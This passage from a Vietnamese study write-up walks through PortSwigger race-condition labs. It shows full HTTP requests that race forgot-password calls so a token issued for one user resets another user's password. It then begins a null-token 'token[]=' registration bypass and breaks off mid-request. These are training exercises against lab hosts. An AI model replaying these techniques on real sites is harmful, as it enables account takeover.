+<span class="err">#</span><span class="w"> </span><span class="nx">Hàm</span><span class="w"> </span><span class="nx">thực</span><span class="w"> </span><span class="nx">hiện</span><span class="w"> </span><span class="nx">gửi</span><span class="w"> </span><span class="nx">email</span><span class="w"> </span><span class="p">(</span><span class="nx">thường</span><span class="w"> </span><span class="nx">chạy</span><span class="w"> </span><span class="nx">bất</span><span class="w"> </span><span class="nx">đồng</span><span class="w"> </span><span class="nx">bộ</span><span class="w"> </span><span class="nx">hoặc</span><span class="w"> </span><span class="nx">có</span><span class="w"> </span><span class="nx">độ</span><span class="w"> </span><span class="nx">trễ</span><span class="p">)</span>
+<span class="nx">def</span><span class="w"> </span><span class="nx">send_confirmation_process</span><span class="p">(</span><span class="nx">user_id</span><span class="p">)</span><span class="o">:</span>
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">ĐIỂM</span><span class="w"> </span><span class="nx">YẾU</span><span class="o">:</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="nx">truy</span><span class="w"> </span><span class="nx">vấn</span><span class="w"> </span><span class="nx">lại</span><span class="w"> </span><span class="nx">DB</span><span class="w"> </span><span class="nx">để</span><span class="w"> </span><span class="nx">lấy</span><span class="w"> </span><span class="nx">địa</span><span class="w"> </span><span class="nx">chỉ</span><span class="w"> </span><span class="s1">&#39;pending_email&#39;</span>
+<span class="w">    </span><span class="nx">user_info</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">db</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;SELECT pending_email FROM users WHERE id = ?&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">user_id</span><span class="p">))</span>
+<span class="w">    </span><span class="nx">email_to_send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">user_info</span><span class="p">[</span><span class="s1">&#39;pending_email&#39;</span><span class="p">]</span>
+
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">Gửi</span><span class="w"> </span><span class="nx">email</span><span class="w"> </span><span class="nx">thực</span><span class="w"> </span><span class="nx">tế</span><span class="w"> </span><span class="nx">với</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="nx">xác</span><span class="w"> </span><span class="nx">nhận</span>
+<span class="w">    </span><span class="nx">email_service</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">to</span><span class="o">=</span><span class="nx">email_to_send</span><span class="p">,</span><span class="w"> </span><span class="nx">body</span><span class="o">=</span><span class="s2">&quot;Nhấn vào link này để xác nhận...&quot;</span><span class="p">)</span>
+</code></pre></div>
+</li>
+</ul>
+<h1 id="lab-exploiting-time-sensitive-vulnerabilities"><strong>Lab: Exploiting time-sensitive vulnerabilities</strong><a class="headerlink" href="#lab-exploiting-time-sensitive-vulnerabilities" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities">Lab: Exploiting time-sensitive vulnerabilities | Web Security Academy</a></p>
+<ul>
+<li>Bài này em có xem solution ở chỗ php xử lý session</li>
+<li>
+<p>Thực hiện điều hướng đến chức năng <code>Forgot password</code> .</p>
+<p><img alt="image.png" src="image%2024.png" /></p>
+</li>
+<li>
+<p>Tại đây, thực hiện gửi username để reset password</p>
+<p><img alt="image.png" src="image%2025.png" /></p>
+</li>
+<li>
+<p>Thực hiện gửi request 2 lần nhận thấy token gen ra là khác nhau → server dùng chuỗi random hoặc dùng timestamp hoặc counter… là những thứ gì khác biệt.</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2026.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Ở đây, mặc dù chúng ta có thể thử case phía server dùng timestamp để gen token. Tuy nhiên như POC ở trên dù cùng thời gian nhưng token vẫn khác nhau. Nhưng còn 1 khả năng nữa đó là dựa vào cookie có <code>phpsessionid</code> thì chúng ta đoán được backend dùng PHP. Và máy chủ này chỉ xử lý 1 request tối đa cho 1 phiên. Vậy thì nhiều phiên cùng lúc thì sẽ vẫn được xử lý cùng lúc.</p>
+</li>
+<li>
+<p>Thực hiện kiểm chứng giả định trên, chúng ta thấy rằng thực sự nếu khác phiên thì 2 request đến cùng lúc vẫn được cùng xử lý. Thực hiện gửi 2 request cùng username <code>wiener</code> nhưng khác phiên để kiểm chứng điều này</p>
+<ul>
+<li>
+<p>POC</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">forgot</span><span class="o">-</span><span class="nx">password</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a73001a0321fdf5804512f300d30040</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">phpsessionid</span><span class="o">=</span><span class="nx">AdQiJA7Wa8vsxRtp3U3tHCspc0eaPb0D</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">53</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a73001a0321fdf5804512f300d30040.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a73001a0321fdf5804512f300d30040.web-security-academy.net/forgot-password</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">csrf</span><span class="o">=</span><span class="nx">rRqUWLmtnT3lu15BBlXok71HMrOdVGyO</span><span class="o">&amp;</span><span class="nx">username</span><span class="o">=</span><span class="nx">wiener</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2027.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Vậy thì chúng ta có thể thử với username khác cho 1 request thì cả 2 token cho 2 username đều giống nhau. Lưu ý, ở đây chúng ta sẽ chỉ gửi 2 request thôi vì nếu nhiều hơn thì khả năng là các request của cùng 1 người dùng sẽ được xử lý trước khiến cho request còn lại sẽ chệch 1 chút và cũng không có ích gì vì nếu cùng phiên thì request cũng không được xử lý.</p>
+<ul>
+<li>
+<p>Request 1</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">forgot</span><span class="o">-</span><span class="nx">password</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a73001a0321fdf5804512f300d30040</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">phpsessionid</span><span class="o">=</span><span class="p">&lt;</span><span class="nt">sessionId1</span><span class="p">&gt;</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">53</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a73001a0321fdf5804512f300d30040.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a73001a0321fdf5804512f300d30040.web-security-academy.net/forgot-password</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">csrf</span><span class="o">=</span><span class="p">&lt;</span><span class="nt">token1</span><span class="p">&gt;</span><span class="o">&amp;</span><span class="nx">username</span><span class="o">=</span><span class="nx">wiener</span>
+</code></pre></div>
+</li>
+<li>
+<p>Request 2</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">forgot</span><span class="o">-</span><span class="nx">password</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a73001a0321fdf5804512f300d30040</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">phpsessionid</span><span class="o">=</span><span class="p">&lt;</span><span class="nt">sessionId2</span><span class="p">&gt;</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">53</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a73001a0321fdf5804512f300d30040.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a73001a0321fdf5804512f300d30040.web-security-academy.net/forgot-password</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">csrf</span><span class="o">=</span><span class="p">&lt;</span><span class="nt">token2</span><span class="p">&gt;</span><span class="o">&amp;</span><span class="nx">username</span><span class="o">=</span><span class="nx">carlos</span>
+</code></pre></div>
+</li>
+<li>
+<p>Thực hiện gửi song song như sau:</p>
+<p><img alt="image.png" src="image%2028.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện lấy token gửi trong mail cho <code>wiener</code>. Thực hiện reset với token này. Trong phần mềm Burpsuite, thực hiện thay đổi param <code>username</code> gửi tới API <code>POST /forgot-password?user=&lt;username&gt;&amp;token=&lt;token&gt;</code> thành <code>carlos</code> . Quan sát thấy reset password thành công</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">forgot</span><span class="o">-</span><span class="nx">password</span><span class="o">?</span><span class="nx">user</span><span class="o">=</span><span class="nx">carlos</span><span class="o">&amp;</span><span class="nx">token</span><span class="o">=</span><span class="nx">c28859d49106c47ef048c72f8defa443222bacc3</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a73001a0321fdf5804512f300d30040</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">phpsessionid</span><span class="o">=</span><span class="nx">Feve6z01s7cJ0vfPYPhQgMv0bLNrakrs</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">130</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a73001a0321fdf5804512f300d30040.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0a73001a0321fdf5804512f300d30040.web-security-academy.net/forgot-password?user=carlos&amp;token=c28859d49106c47ef048c72f8defa443222bacc3</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">csrf</span><span class="o">=</span><span class="nx">dRsVpA9GOcEfBzTEo8jvAT3qodm2cMoJ</span><span class="o">&amp;</span><span class="nx">token</span><span class="o">=</span><span class="nx">c28859d49106c47ef048c72f8defa443222bacc3</span><span class="o">&amp;</span><span class="nx">user</span><span class="o">=</span><span class="nx">carlos</span><span class="o">&amp;</span><span class="ow">new</span><span class="o">-</span><span class="nx">password</span><span class="o">-</span><span class="mf">1</span><span class="o">=</span><span class="mf">1</span><span class="o">&amp;</span><span class="ow">new</span><span class="o">-</span><span class="nx">password</span><span class="o">-</span><span class="mf">2</span><span class="o">=</span><span class="mf">1</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2029.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Login vào tài khoản <code>carlos</code> , điều hướng đến chức năng <code>Admin panel</code> và thành công xóa user. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2030.png" /></p>
+<p><img alt="image.png" src="image%2031.png" /></p>
+</li>
+</ul>
+<h1 id="lab-partial-construction-race-conditions"><strong>Lab: Partial construction race conditions</strong><a class="headerlink" href="#lab-partial-construction-race-conditions" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction">Lab: Partial construction race conditions | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện điều hướng đến chức năng <code>Register</code></p>
+<p><img alt="image.png" src="image%2032.png" /></p>
+</li>
+<li>
+<p>Tại đây, thực hiện đăng ký với email có domain như mô tả</p>
+<p><img alt="image.png" src="image%2033.png" /></p>
+</li>
+<li>
+<p>Sau đó, thực hiện đọc file js <code>/resources/static/users.js</code> thấy có xuất hiện path ẩn để confirm tài khoản với token được gửi về mail</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2034.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Ở đây, nếu như thực hiện đăng ký mail khác mail trong mô tả thì sẽ bị báo lỗi, vì vậy chúng ta không thể lấy được token từ mail. Tuy nhiên, vì có thể trong quá trình ghi object mới vào db, thời gian gen ra token lâu hơn sẽ ghi sau → có khoảng cách giữa 2 bước → token khoảng giữa thời gian này sẽ null → attack kiểm soát được token null bằng một số phương pháp.</p>
+</li>
+<li>Để thực hiện ý tưởng trên, chúng ta có thể truyền token dạng <code>token[]=</code> , phía server có thể xử lý như một giá trị null khi đưa vào hash và so sánh với dữ liệu lấy từ db</li>
+<li>
+<p>Thực hiện bắt request gửi tới API <code>POST /register</code> và tạo request gửi tới API <code>POST /confirm</code> . Hai request sẽ như sau:</p>
+<ul>
+<li>
+<p>API <code>POST /register</code></p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">register</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">aaa005c041d082083fcf075009700f1</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">phpsessionid</span><span class="o">=</span><span class="nx">DDDALC9UwlBKnbzppJaeZFU5A4EZdEDW</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">91</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0aaa005c041d082083fcf075009700f1.web-security-academy.net</span>
